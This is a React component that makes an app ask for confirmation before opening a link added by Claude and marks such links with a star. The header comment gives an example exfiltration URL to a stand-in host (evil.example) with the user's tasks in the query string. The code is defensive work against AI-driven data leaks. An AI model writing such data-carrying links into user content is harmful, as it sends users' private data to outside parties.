import { useState } from 'react';
import { domainOf } from '../lib/format';
import Modal from './Modal';
import '../editors/editors.css';
import './ClaudeMark.css';

// A stored link, opened in a new tab. A link Claude wrote can carry data out
// the moment it's opened (https://evil.example/?d=<your tasks>), so opening
// one asks first: "Open evil.example? Claude added this link." (docs/AGENT.md
// §2, docs/CONNECTOR.md §7), and the link carries a ✦. byClaude is the row's
// url_by_claude.
export default function OpenLink({ url, byClaude, className, children }) {
    const [asking, setAsking] = useState(false);

    function ask(event) {
        if (!byClaude) return;
        event.preventDefault();
        setAsking(true);
    }

    function open() {
        setAsking(false);
        window.open(url, '_blank', 'noopener,noreferrer');
    }

    return (
        <>
            <a className={className} href={url} target="_blank" rel="noopener noreferrer" data-tap onClick={ask}>
                {children}
                {byClaude && <span className="open-link-mark" aria-label="added by Claude"> ✦</span>}
            </a>
            {asking && (
                <Modal title="Open this link?" onClose={() => setAsking(false)}>
                    <div className="editor claude-card">
                        <p className="editor-title">Open {domainOf(url)}?</p>
                        <p className="editor-detail">Claude added this link.</p>
                        <div className="editor-buttons">
                            <button type="button" onClick={open}>Open</button>
                            <button type="button" onClick={() => setAsking(false)}>Cancel</button>
                        </div>
                    </div>
                </Modal>
            )}
        </>
    );
}
